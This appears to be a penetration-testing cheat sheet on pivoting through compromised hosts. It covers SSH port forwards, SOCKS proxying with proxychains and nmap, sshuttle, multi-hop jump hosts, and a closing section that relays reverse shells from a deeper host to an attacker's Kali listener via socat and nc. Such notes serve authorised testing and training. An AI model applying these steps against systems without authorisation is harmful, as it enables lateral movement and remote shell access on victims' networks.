# SSH and Socat forwards

## Port forwards
```bash
# Local: Kali opens a port to a service reachable from the SSH server
ssh -N -L 8000:127.0.0.1:8000 <USER>@<IP>

# Remote: run on the foothold; Kali listens on 127.0.0.1:2345 → internal service
ssh -N -R 127.0.0.1:2345:<IP>:5432 <USER>@<KALI>
```
```bash
# Single TCP relay on a foothold
socat -ddd TCP-LISTEN:2345,fork TCP:<IP>:5432
```
- `-L` listens on the SSH-client host.
- `ss -lntp`: bind `0.0.0.0` only when others need to reach it.

## SOCKS / subnet
```bash
ssh -N -D 1080 <USER>@<IP>
proxychains nmap -sT -Pn -p 139,445,3389 <IP>
sshuttle -r <USER>@<IP> <SUBNET>/24
```
- Set `socks5 127.0.0.1 1080` in `/etc/proxychains4.conf`.
- Through SOCKS: Nmap `-sT -Pn` only (no SYN, UDP or ping).
- sshuttle: avoid route overlap with the local network.

## Jump hosts: more than one hop
```bash
ssh -J <USER1>@<PIVOT1> <USER2>@<PIVOT2>
ssh -J <USER1>@<PIVOT1> -N -D 1080 <USER2>@<PIVOT2>
ssh -J <USER1>@<PIVOT1> -N -L 8080:<INTERNAL2>:80 <USER2>@<PIVOT2>
ssh -J <USER1>@<PIVOT1>,<USER2>@<PIVOT2> <USER3>@<PIVOT3>
```
- `-J` takes a comma-separated chain. The SOCKS port (`-D`) or forward (`-L`) opens on Kali and exits at the last host.
- Different keys or ports per hop: put them in `~/.ssh/config`:
```text
Host pivot1
    HostName <PIVOT1>
    User <USER1>
    IdentityFile ~/.ssh/<KEY1>
Host pivot2
    HostName <PIVOT2>
    User <USER2>
    IdentityFile ~/.ssh/<KEY2>
    ProxyJump pivot1
```
```bash
ssh pivot2
```
- Without `ProxyJump` support (very old client): `ssh -o ProxyCommand='ssh -W %h:%p <USER1>@<PIVOT1>' <USER2>@<PIVOT2>`.

Reverse shells from a deeper host through the first pivot:
```bash
# on pivot1 (reachable from the deeper host and able to reach Kali)
socat TCP-LISTEN:443,fork TCP:<KALI>:443
```
- Payload connects to `<PIVOT1>:443`; `nc -lvnp 443` stays on Kali. Remote forward alternative: `ssh -N -R 0.0.0.0:443:127.0.0.1:443 <USER1>@<PIVOT1>` needs `GatewayPorts yes` in the pivot's `sshd_config` to bind beyond loopback.
